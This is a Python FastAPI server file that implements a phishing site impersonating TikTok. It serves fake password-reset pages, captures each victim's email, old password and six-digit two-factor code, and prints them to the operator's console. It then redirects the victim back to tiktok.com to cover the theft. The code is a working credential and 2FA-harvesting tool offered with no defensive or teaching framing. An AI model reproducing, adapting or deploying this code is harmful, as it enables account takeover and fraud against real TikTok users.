from datetime import datetime

from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from urllib.parse import urlencode


app = FastAPI()


@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="https://www.tiktok.com/")


@app.get("/reset-password", response_class=HTMLResponse)
async def reset_password():
    with open("index.html", "r") as f:
        return f.read()


@app.get("/reset-failed", response_class=HTMLResponse)
async def reset_failed():
    with open("reset-failed.html", "r") as f:
        return f.read()


@app.post("/submit-form")
async def submit_form(email: str = Form(...), old_password: str = Form(...)):
    query_params = urlencode({"email": email, "old-password": old_password})
    __now = datetime.now().strftime("%H:%M")
    print(
        f"\n{__now} >>> 🚀 New submission | Email: {email}, password: {old_password} \n"
    )
    return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)


@app.get("/login-code", response_class=HTMLResponse)
async def login_code(request: Request):
    email = request.query_params.get("email", "")
    old_password = request.query_params.get("old-password", "")
    with open("login-code.html", "r") as f:
        page = f.read()

    page = page.replace("{user-email}", email)
    page = page.replace("{old-password}", old_password)
    return page


@app.post("/submit-2fa", response_class=HTMLResponse)
async def login(
    num1: int = Form(...),
    num2: int = Form(...),
    num3: int = Form(...),
    num4: int = Form(...),
    num5: int = Form(...),
    num6: int = Form(...),
    email: str = Form(...),
    old_password: str = Form(...),
):
    code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
    __now = datetime.now().strftime("%H:%M")
    print(
        f"\n{__now} >>> 💰 Verification code for {email}: {code} (password: {old_password})\n"
    )

    with open("change-password.html", "r") as f:
        return f.read()


@app.post("/change-password")
async def change_password():
    return RedirectResponse(url="https://www.tiktok.com", status_code=303)
